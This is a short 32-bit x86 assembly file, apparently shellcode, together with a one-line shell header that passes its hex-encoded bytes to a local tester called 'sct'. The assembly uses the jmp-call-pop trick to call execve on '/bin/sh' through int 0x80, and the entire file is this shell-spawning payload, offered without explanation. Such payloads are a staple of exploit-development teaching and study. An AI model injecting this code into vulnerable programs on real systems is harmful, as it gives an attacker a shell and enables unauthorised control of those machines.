
true :; ./sct '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'; exit

bits 32

    jmp    push_arg
callback:
    pop    ebx
    xor    eax,eax
    xor    ecx,ecx
    xor    edx,edx
    mov    al,0xb
    int    0x80
push_arg:
    call   callback
    db '/bin/sh'
